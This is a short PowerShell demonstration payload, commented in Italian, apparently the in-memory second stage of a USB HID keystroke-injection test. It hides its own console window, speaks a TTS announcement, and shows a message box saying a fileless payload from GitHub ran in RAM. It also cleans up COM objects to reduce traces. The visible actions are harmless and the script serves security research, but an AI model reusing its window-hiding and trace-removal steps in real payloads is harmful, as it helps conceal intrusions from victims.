<#
.SYNOPSIS
    PoC di esecuzione in-memory via HID.
    Dimostra l'interazione con l'interfaccia utente grafica (GUI) e i componenti COM.
#>

# 1. Nasconde la finestra del terminale nel caso in cui lo stager non l'abbia già fatto
$window = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int hWnd, int nCmdShow);' -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$window::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)

# 2. Istanzia il componente COM legacy per la sintesi vocale (Text-To-Speech)
$speaker = New-Object -ComObject SAPI.SpVoice

# Esegue la voce in modalità asincrona (flag 1) per non bloccare l'esecuzione del codice successivo
$speaker.Speak("Attenzione. Proof of concept eseguita con successo in memoria volatile.", 1)

# 3. Carica l'assembly .NET necessario per le interfacce grafiche Forms
Add-Type -AssemblyName System.Windows.Forms

# 4. Genera una MessageBox nativa a livello di OS (Tipo 0 = OK, Icona 64 = Informazione)
$msg = "Il payload fileless è stato scaricato da GitHub ed eseguito in RAM.`n`nL'iniezione USB HID tramite ALT-Codes ha bypassato con successo il layout della tastiera."
[System.Windows.Forms.MessageBox]::Show($msg, "Test di Sicurezza Accademico", 0, 64)

# Forza una Garbage Collection pulita per rimuovere le tracce in memoria degli oggetti COM
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($speaker) | Out-Null